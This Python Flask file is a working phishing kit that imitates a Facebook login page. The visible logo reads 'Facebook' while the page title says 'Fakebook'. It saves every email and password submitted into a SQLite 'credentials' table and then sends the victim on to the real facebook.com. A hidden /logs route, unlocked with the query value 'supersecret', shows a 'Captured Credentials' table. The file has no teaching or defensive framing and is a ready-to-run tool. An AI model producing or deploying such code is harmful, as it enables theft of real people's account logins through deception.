from flask import Flask, request, render_template_string, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  email TEXT,
                  password TEXT,
                  timestamp DATETIME)''')
    conn.commit()
    conn.close()

init_db()

html_content = """
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Fakebook - Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover {
            background-color: #1558b0;
        }
        .forgot-link {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
        }
        .signup-btn {
            margin-top: 20px;
            background-color: #42b72a;
        }
        .signup-btn:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"logo\">Facebook</div>
        <form action=\"/login\" method=\"POST\">
            <input type=\"text\" name=\"email\" placeholder=\"Email or phone number\" required>
            <input type=\"password\" name=\"password\" placeholder=\"Password\" required>
            <button type=\"submit\" class=\"login-btn\">Log In</button>
        </form>
        <a href=\"#\" class=\"forgot-link\">Forgot password?</a>
        <button class=\"login-btn signup-btn\">Create New Account</button>
    </div>
</body>
</html>
"""


logs_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #f9f9f9; }
    </style>
</head>
<body>
    <h1>Captured Credentials</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>Timestamp</th>
        </tr>
        {% for entry in entries %}
        <tr>
            <td>{{ entry[0] }}</td>
            <td>{{ entry[1] }}</td>
            <td>{{ entry[2] }}</td>
            <td>{{ entry[3] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)",
              (email, password, timestamp))
    conn.commit()
    conn.close()

    return redirect("https://www.facebook.com")

@app.route('/logs')
def show_logs():
    if request.args.get('secret') != 'supersecret':
        return "Not Found", 404
    
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
    entries = c.fetchall()
    conn.close()
    
    return render_template_string(logs_template, entries=entries)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)